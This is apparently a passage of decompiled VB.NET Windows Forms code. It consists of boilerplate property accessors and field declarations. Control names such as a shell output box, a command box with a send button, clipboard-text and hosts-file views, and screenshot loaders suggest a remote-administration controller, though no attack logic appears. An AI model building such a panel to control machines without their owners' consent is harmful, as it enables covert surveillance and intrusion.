        Friend Overridable Property DotNetBarTabcontrol1 As DotNetBarTabcontrol
            <DebuggerNonUserCode> _
            Get
                Return Me._DotNetBarTabcontrol1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As DotNetBarTabcontrol)
                Me._DotNetBarTabcontrol1 = value
            End Set
        End Property

        Friend Overridable Property FlatCloseMISC1 As FlatCloseMISC
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseMISC1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseMISC)
                Me._FlatCloseMISC1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property rtb_cptext As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtb_cptext
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtb_cptext = value
            End Set
        End Property

        Friend Overridable Property rtb_hosts As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtb_hosts
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtb_hosts = value
            End Set
        End Property

        Friend Overridable Property rtb_shell As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtb_shell
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtb_shell = value
            End Set
        End Property

        Friend Overridable Property TabPage1 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage1 = value
            End Set
        End Property

        Friend Overridable Property TabPage2 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage2 = value
            End Set
        End Property

        Friend Overridable Property TabPage3 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage3 = value
            End Set
        End Property

        Friend Overridable Property TabPage4 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage4 = value
            End Set
        End Property

        Friend Overridable Property tb_command As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_command
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TextBox)
                Dim handler As KeyEventHandler = New KeyEventHandler(AddressOf Me.tb_command_KeyDown)
                If (Not Me._tb_command Is Nothing) Then
                    RemoveHandler Me._tb_command.KeyDown, handler
                End If
                Me._tb_command = value
                If (Not Me._tb_command Is Nothing) Then
                    AddHandler Me._tb_command.KeyDown, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btn_getimage")> _
        Private _btn_getimage As FlatButton
        <AccessedThroughProperty("btn_load")> _
        Private _btn_load As FlatButton
        <AccessedThroughProperty("btn_loadcptext")> _
        Private _btn_loadcptext As FlatButton
        <AccessedThroughProperty("btn_save")> _
        Private _btn_save As FlatButton
        <AccessedThroughProperty("btn_savecptext")> _
        Private _btn_savecptext As FlatButton
        <AccessedThroughProperty("btn_saveimage")> _
        Private _btn_saveimage As FlatButton
        <AccessedThroughProperty("btn_sendcmd")> _
        Private _btn_sendcmd As FlatButton
        <AccessedThroughProperty("DotNetBarTabcontrol1")> _
        Private _DotNetBarTabcontrol1 As DotNetBarTabcontrol
        <AccessedThroughProperty("FlatCloseMISC1")> _
        Private _FlatCloseMISC1 As FlatCloseMISC
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("rtb_cptext")> _
        Private _rtb_cptext As RichTextBox
        <AccessedThroughProperty("rtb_hosts")> _
        Private _rtb_hosts As RichTextBox
        <AccessedThroughProperty("rtb_shell")> _
        Private _rtb_shell As RichTextBox
        <AccessedThroughProperty("TabPage1")> _
        Private _TabPage1 As TabPage
        <AccessedThroughProperty("TabPage2")> _
        Private _TabPage2 As TabPage
        <AccessedThroughProperty("TabPage3")> _
        Private _TabPage3 As TabPage
        <AccessedThroughProperty("TabPage4")> _
        Private _TabPage4 As TabPage
        <AccessedThroughProperty("tb_command")> _
        Private _tb_command As TextBox
        Private components As IContainer
        Public connected As String
        Private loadcptext As Thread
        Private loadhosts As Thread
        Private loadimage As Thread
        Private loadshell As Thread
        Private server As API
        Private url As String

        ' Nested Types
        Public Delegate Sub DelegateWrite(ByVal [text] As String)

        Public Delegate Sub DelegateWriteCPText(ByVal [text] As String)

        Public Delegate Sub DelegateWriteImage(ByVal bytes As Byte())

        Public Delegate Sub DelegateWriteShell(ByVal [text] As String)
    End Class
End Namespace

